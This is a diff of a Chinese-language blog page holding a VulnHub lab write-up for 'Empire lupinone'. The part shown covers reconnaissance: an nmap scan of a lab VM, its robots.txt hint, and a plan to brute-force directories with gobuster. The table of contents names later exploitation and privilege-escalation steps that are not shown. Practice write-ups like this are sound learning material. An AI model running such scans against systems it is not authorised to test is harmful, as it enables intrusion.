@@ -1,180 +1,1222 @@
-<!doctype html><html lang=zh dir=ltr><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="一、信息搜集#1.1 端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 3PORT STATE SERVICE VERSION 422/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) 5| ssh-hostkey: 6| 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) 7| 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) 8|_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 980/tcp open http Apache httpd 2.4.48 ((Debian)) 10| http-robots.txt: 1 disallowed entry 11|_/~myfiles 12|_http-server-header: Apache/2.4.48 (Debian) 13|_http-title: Site doesn't have a title (text/html). 14MAC Address: 00:0C:29:0D:71:11 (VMware) 15Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles
-"><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/"><meta property="og:site_name" content="vnccer"><meta property="og:title" content="Empire lupinone"><meta property="og:description" content="一、信息搜集#1.1 端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 3PORT STATE SERVICE VERSION 422/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) 5| ssh-hostkey: 6| 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) 7| 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) 8|_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 980/tcp open http Apache httpd 2.4.48 ((Debian)) 10| http-robots.txt: 1 disallowed entry 11|_/~myfiles 12|_http-server-header: Apache/2.4.48 (Debian) 13|_http-title: Site doesn't have a title (text/html). 14MAC Address: 00:0C:29:0D:71:11 (VMware) 15Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles"><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="docs"><meta property="article:published_time" content="2026-03-11T00:00:00+00:00"><meta property="article:modified_time" content="2026-03-11T22:27:33+08:00"><meta itemprop=name content="Empire lupinone"><meta itemprop=description content="一、信息搜集#1.1 端口扫描#1┌──(kali㉿kali)-[~] 2└─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 3PORT STATE SERVICE VERSION 422/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) 5| ssh-hostkey: 6| 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) 7| 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) 8|_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 980/tcp open http Apache httpd 2.4.48 ((Debian)) 10| http-robots.txt: 1 disallowed entry 11|_/~myfiles 12|_http-server-header: Apache/2.4.48 (Debian) 13|_http-title: Site doesn't have a title (text/html). 14MAC Address: 00:0C:29:0D:71:11 (VMware) 15Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles"><meta itemprop=datePublished content="2026-03-11T00:00:00+00:00"><meta itemprop=dateModified content="2026-03-11T22:27:33+08:00"><meta itemprop=wordCount content="493"><title>Empire lupinone | vnccer</title><link rel=icon href=/AK47.png><link rel=manifest href=/manifest.json><link rel=canonical href=http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/><link rel=stylesheet href=/book.min.326841005b40561605b2115d01f6c968310c7418136629028362d36e053c379d.css integrity="sha256-MmhBAFtAVhYFshFdAfbJaDEMdBgTZikCg2LTbgU8N50=" crossorigin=anonymous><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css><script defer src=/fuse.min.js></script><script defer src=/zh.search.min.66c1db10d16485077a36978ecae911247f7957b6d1fac2f37e4d0f3122855ee3.js integrity="sha256-ZsHbENFkhQd6NpeOyukRJH95V7bR+sLzfk0PMSKFXuM=" crossorigin=anonymous></script><script>(function(){localStorage.getItem("sidebar-collapsed")==="true"&&document.documentElement.classList.add("sidebar-collapsed-init")})()</script></head><body dir=ltr class="book-kind-page book-type-docs"><input type=checkbox class="hidden toggle" id=menu-control>
-<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/flamez.png alt=Logo><span>vnccer</span></a></h2><div class="book-search hidden"><input id=book-search-input type=text placeholder=搜索 aria-label=搜索 maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script><ul><li><a href=/docs/>🏠 返回主页</a></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button><ul><li><input type=checkbox id=section-4812594788d2c7059bd80232c02af0d6 class=toggle checked>
-<label for=section-4812594788d2c7059bd80232c02af0d6 class=flex><a href=/docs/cybersecurity/><span style=display:inline-flex;align-items:center;gap:8px><span>🛡️</span><span>网安</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-4b8026b2ef91fed29957b6dd552f3cd1 class=toggle>
-<label for=section-4b8026b2ef91fed29957b6dd552f3cd1 class=flex><a href=/docs/cybersecurity/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/dvwa/dvwa/><span style=display:inline-flex;align-items:center;gap:8px><span>DVWA全难度</span></span></a></li></ul></li><li><input type=checkbox id=section-33d66818bfeced9ba6f59416de59c638 class=toggle>
-<label for=section-33d66818bfeced9ba6f59416de59c638 class=flex><a href=/docs/cybersecurity/vulnerabilities/><span style=display:inline-flex;align-items:center;gap:8px><span>vulnerabilities</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnerabilities/apache-log4j2cve-2021-44228%E5%A4%B1%E8%B4%A5%E5%B0%9D%E8%AF%95/><span style=display:inline-flex;align-items:center;gap:8px><span>基于docker的log4j2（CVE-2021-44228）漏洞（失败）</span></span></a></li></ul></li><li><input type=checkbox id=section-1061c6c3a619113d31feeef8b55aa0af class=toggle checked>
-<label for=section-1061c6c3a619113d31feeef8b55aa0af class=flex><a href=/docs/cybersecurity/vulnhub/><span style=display:inline-flex;align-items:center;gap:8px><span>VULNHUB</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-d6fb052e486182e9d950efd6bdcd7544 class=toggle>
-<label for=section-d6fb052e486182e9d950efd6bdcd7544 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-beelzebub_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Beelzebub: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-empire_breakout/><span style=display:inline-flex;align-items:center;gap:8px><span>Empire Breakout</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-ica_1/><span style=display:inline-flex;align-items:center;gap:8px><span>ICA: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-jangow_1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>jangow 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-napping-1.0.1/><span style=display:inline-flex;align-items:center;gap:8px><span>Napping: 1.0.1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-noob_1/><span style=display:inline-flex;align-items:center;gap:8px><span>Noob: 1</span></span></a></li><li><a href=/docs/cybersecurity/vulnhub/easy/vulnhub-the-planets_earth/><span style=display:inline-flex;align-items:center;gap:8px><span>The planets earth</span></span></a></li></ul></li><li><input type=checkbox id=section-217a33c9ab6cb7480b66e6fc3c901104 class=toggle checked>
-<label for=section-217a33c9ab6cb7480b66e6fc3c901104 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/vulnhub/medium/vulnhub-empire_lupinone/ class=active><span style=display:inline-flex;align-items:center;gap:8px><span>Empire lupinone</span></span></a></li></ul></li><li><input type=checkbox id=section-90b87787f24b7d37429e1cd5b0528c96 class=toggle>
-<label for=section-90b87787f24b7d37429e1cd5b0528c96 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li><li><input type=checkbox id=section-e39c1a654e59f621dd1360f7f30a45b5 class=toggle>
-<label for=section-e39c1a654e59f621dd1360f7f30a45b5 class=flex><a href=/docs/cybersecurity/ctf/><span style=display:inline-flex;align-items:center;gap:8px><span>CTF</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0487c019683c53bd5946a574af947fcd class=toggle>
-<label for=section-0487c019683c53bd5946a574af947fcd class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>easy</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/cybersecurity/ctf/easy/ctf-web-low/><span style=display:inline-flex;align-items:center;gap:8px><span>web-low</span></span></a></li></ul></li><li><input type=checkbox id=section-449a2c3b61b7512315c644ea5feb5715 class=toggle>
-<label for=section-449a2c3b61b7512315c644ea5feb5715 class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>medium</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-011df73066cb46bd9a3b70d7ab49a0ab class=toggle>
-<label for=section-011df73066cb46bd9a3b70d7ab49a0ab class=flex><a role=button><span style=display:inline-flex;align-items:center;gap:8px><span>hard</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li></ul></li></ul></li><li><input type=checkbox id=section-7aec202ce54c41749fd44d4107024bd0 class=toggle>
-<label for=section-7aec202ce54c41749fd44d4107024bd0 class=flex><a href=/docs/papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📄</span><span>论文</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><input type=checkbox id=section-0b5f6bcc8205d8c69a48df615a80be2c class=toggle>
-<label for=section-0b5f6bcc8205d8c69a48df615a80be2c class=flex><a href=/docs/papers/et-bert/et-bert/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li><li><input type=checkbox id=section-ff28b038514d9b4fa29796997b003b8a class=toggle>
-<label for=section-ff28b038514d9b4fa29796997b003b8a class=flex><a href=/docs/papers/et-bert/et-bert%E5%A4%8D%E7%8E%B0/><span style=display:inline-flex;align-items:center;gap:8px><span>ET-BERT复现</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label></li></ul></li><li><input type=checkbox id=section-601151e093f781f3949570b4dccefe4b class=toggle>
-<label for=section-601151e093f781f3949570b4dccefe4b class=flex><a href=/docs/work/><span style=display:inline-flex;align-items:center;gap:8px><span>💼</span><span>未来</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/work/n/><span style=display:inline-flex;align-items:center;gap:8px><span>N</span></span></a></li></ul></li><li><input type=checkbox id=section-114786bd93b83846332283540536c052 class=toggle>
-<label for=section-114786bd93b83846332283540536c052 class=flex><a href=/docs/ai/><span style=display:inline-flex;align-items:center;gap:8px><span>🤖</span><span>AI</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-1b825241e23f5ffe0a3e34d4481bfcee class=toggle>
-<label for=section-1b825241e23f5ffe0a3e34d4481bfcee class=flex><a href=/docs/skills/><span style=display:inline-flex;align-items:center;gap:8px><span>🛠️</span><span>技能</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/skills/anaconda%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/><span style=display:inline-flex;align-items:center;gap:8px><span>anaconda环境配置</span></span></a></li><li><a href=/docs/skills/kali-linux/><span style=display:inline-flex;align-items:center;gap:8px><span>kali linux基础</span></span></a></li><li><a href=/docs/skills/switchyomega-mv3%E6%93%8D%E4%BD%9C%E8%AE%B0%E5%BD%95/><span style=display:inline-flex;align-items:center;gap:8px><span>SwitchyOmega mv3操作记录</span></span></a></li><li><a href=/docs/skills/win-+-r%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/><span style=display:inline-flex;align-items:center;gap:8px><span>win + r常用指令</span></span></a></li><li><a href=/docs/skills/%E5%9F%BA%E4%BA%8Evmware%E7%9A%84kali-linux%E4%B8%8B%E7%9A%84docker%E9%83%A8%E7%BD%B2%E5%9D%91%E5%A4%9A/><span style=display:inline-flex;align-items:center;gap:8px><span>基于vmware的kali linux下的docker部署(坑多)</span></span></a></li><li><a href=/docs/skills/%E7%BD%91%E7%AB%99%E6%9E%84%E5%BB%BA/><span style=display:inline-flex;align-items:center;gap:8px><span>网站构建</span></span></a></li></ul></li><li><input type=checkbox id=section-f61a54d247f538b8e499d8d6a63dd0af class=toggle>
-<label for=section-f61a54d247f538b8e499d8d6a63dd0af class=flex><a href=/docs/life/><span style=display:inline-flex;align-items:center;gap:8px><span>☕</span><span>生活</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul></ul></li><li><input type=checkbox id=section-5fcfcafd77cf38869672166f51c04c8e class=toggle>
-<label for=section-5fcfcafd77cf38869672166f51c04c8e class=flex><a href=/docs/navigator/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-compass" style=width:1.25em;text-align:center></i><span>网站导航</span>
-</span></a><img src=/icons/chevron-right.svg class=book-icon alt=Expand></label><ul><li><a href=/docs/navigator/n_cyber-range/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-bolt-lightning" style=width:1.25em;text-align:center></i><span>打靶</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_papers/><span style=display:inline-flex;align-items:center;gap:8px><span>📃</span><span>论文</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_work/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-briefcase" style=width:1.25em;text-align:center></i><span>工作</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_ai/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-robot" style=width:1.25em;text-align:center></i><span>AI</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_function/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gears" style=width:1.25em;text-align:center></i><span>Function</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_life/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-gamepad" style=width:1.25em;text-align:center></i><span>Life</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_forum/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-hippo" style=width:1.25em;text-align:center></i><span>平台</span></span></a><ul></ul></li><li><a href=/docs/navigator/n_airport/><span style=display:inline-flex;align-items:center;gap:8px><i class="fa-solid fa-plane" style=width:1.25em;text-align:center></i><span>机场</span></span></a><ul></ul></li></ul></li></ul><button class=sidebar-toggle onclick=toggleSidebar() aria-label="Toggle Sidebar">
-<i class="fas fa-angle-left"></i></button></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class="book-header hidden"><div class="flex align-center justify-between"><label for=menu-control><img src=/icons/menu.svg class=book-icon alt=Menu></label><h3>Empire lupinone</h3><label for=toc-control><img src=/icons/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class=hidden><nav id=TableOfContents><ul><li><a href=#一信息搜集>一、信息搜集</a><ul><li><a href=#11-端口扫描>1.1 端口扫描</a></li><li><a href=#12-目录扫描>1.2 目录扫描</a></li></ul></li><li><a href=#二信息解密和爆破>二、信息解密和爆破</a></li><li><a href=#三ssh登录>三、SSH登录</a></li><li><a href=#四水平越权>四、水平越权</a><ul><li><ul><li><a href=#41-找漏洞>4.1 找漏洞</a></li><li><a href=#42-漏洞利用文件源码中添加命令行>4.2 漏洞利用：文件源码中添加命令行</a></li></ul></li></ul></li><li><a href=#五提权>五、提权</a></li></ul></nav></aside></header><article class="markdown book-article"><h1 id=一信息搜集>一、信息搜集<a class=anchor href=#%e4%b8%80%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86>#</a></h1><h2 id=11-端口扫描>1.1 端口扫描<a class=anchor href=#11-%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f>#</a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-ZSH data-lang=ZSH><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span>┌──<span style=color:#ff7b72;font-weight:700>(</span>kali㉿kali<span style=color:#ff7b72;font-weight:700>)</span>-<span style=color:#ff7b72;font-weight:700>[</span>~<span style=color:#ff7b72;font-weight:700>]</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>└─$ sudo nmap -sS -sV -sC -T4 192.168.174.132
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>PORT   STATE SERVICE VERSION
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian <span style=color:#a5d6ff>5</span> <span style=color:#ff7b72;font-weight:700>(</span>protocol 2.0<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>| ssh-hostkey: 
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>|   <span style=color:#a5d6ff>3072</span> ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 <span style=color:#ff7b72;font-weight:700>(</span>RSA<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>|   <span style=color:#a5d6ff>256</span> bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 <span style=color:#ff7b72;font-weight:700>(</span>ECDSA<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>|_  <span style=color:#a5d6ff>256</span> ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f <span style=color:#ff7b72;font-weight:700>(</span>ED25519<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>80/tcp open  http    Apache httpd 2.4.48 <span style=color:#ff7b72;font-weight:700>((</span>Debian<span style=color:#ff7b72;font-weight:700>))</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>| http-robots.txt: <span style=color:#a5d6ff>1</span> disallowed entry 
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>|_/~myfiles
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>|_http-server-header: Apache/2.4.48 <span style=color:#ff7b72;font-weight:700>(</span>Debian<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span>|_http-title: Site doesn<span style=color:#f85149>&#39;</span>t have a title <span style=color:#ff7b72;font-weight:700>(</span>text/html<span style=color:#ff7b72;font-weight:700>)</span>.
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">14</span><span>MAC Address: 00:0C:29:0D:71:11 <span style=color:#ff7b72;font-weight:700>(</span>VMware<span style=color:#ff7b72;font-weight:700>)</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">15</span><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span></code></pre></div><p>接着访问80端口、robots.txt、/~myfiles</p><p>robots.txt：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTML data-lang=HTML><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">1</span><span>User-agent: *
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">2</span><span>Disallow: /~myfiles</span></span></code></pre></div><p>/~myfiles：</p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-HTML data-lang=HTML><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 1</span><span><span style=color:#8b949e;font-weight:700;font-style:italic>&lt;!DOCTYPE html&gt;</span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 2</span><span>&lt;<span style=color:#7ee787>html</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 3</span><span>&lt;<span style=color:#7ee787>head</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 4</span><span>&lt;<span style=color:#7ee787>title</span>&gt;Error 404&lt;/<span style=color:#7ee787>title</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 5</span><span>&lt;/<span style=color:#7ee787>head</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 6</span><span>&lt;<span style=color:#7ee787>body</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 7</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 8</span><span>&lt;<span style=color:#7ee787>h1</span>&gt;Error 404&lt;/<span style=color:#7ee787>h1</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681"> 9</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">10</span><span>&lt;/<span style=color:#7ee787>body</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">11</span><span>&lt;/<span style=color:#7ee787>html</span>&gt;
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">12</span><span>
-</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#6e7681">13</span><span><span style=color:#8b949e;font-style:italic>&lt;!-- Your can do it, keep trying. --&gt;</span></span></span></code></pre></div><p>什么也没有发现，但根据提示，有文件是<code>/~文件名</code>这种格式的，因此思路是目录扫描再找类似的文件</p><h2 id=12-目录扫描>1.2 目录扫描<a class=anchor href=#12-%e7%9b%ae%e5%bd%95%e6%89%ab%e6%8f%8f>#</a></h2><p><code>dirb http://192.168.174.132</code>，结果混乱，因此转用gobuster
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="一、信息搜集#1.1 端口扫描#┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) | 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) |_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) | http-robots.txt: 1 disallowed entry |_/~myfiles |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn&#39;t have a title (text/html). MAC Address: 00:0C:29:0D:71:11 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles
+robots.txt：
+User-agent: * Disallow: /~myfiles/~myfiles：
+&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Error 404&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error 404&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- Your can do it, keep trying. --&gt;什么也没有发现，但根据提示，有文件是/~文件名这种格式的，因此思路是目录扫描再找类似的文件
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/cybersecurity/vulnhub/medium/vulnhub-Empire_lupinone/">
+  <meta property="og:site_name" content="vnccer">
+  <meta property="og:title" content="Empire lupinone">
+  <meta property="og:description" content="一、信息搜集#1.1 端口扫描#┌──(kali㉿kali)-[~] └─$ sudo nmap -sS -sV -sC -T4 192.168.174.132 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5 (protocol 2.0) | ssh-hostkey: | 3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA) | 256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA) |_ 256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519) 80/tcp open http Apache httpd 2.4.48 ((Debian)) | http-robots.txt: 1 disallowed entry |_/~myfiles |_http-server-header: Apache/2.4.48 (Debian) |_http-title: Site doesn&#39;t have a title (text/html). MAC Address: 00:0C:29:0D:71:11 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel接着访问80端口、robots.txt、/~myfiles
+robots.txt：
+User-agent: * Disallow: /~myfiles/~myfiles：
+&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Error 404&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Error 404&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; &lt;!-- Your can do it, keep trying. --&gt;什么也没有发现，但根据提示，有文件是/~文件名这种格式的，因此思路是目录扫描再找类似的文件">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
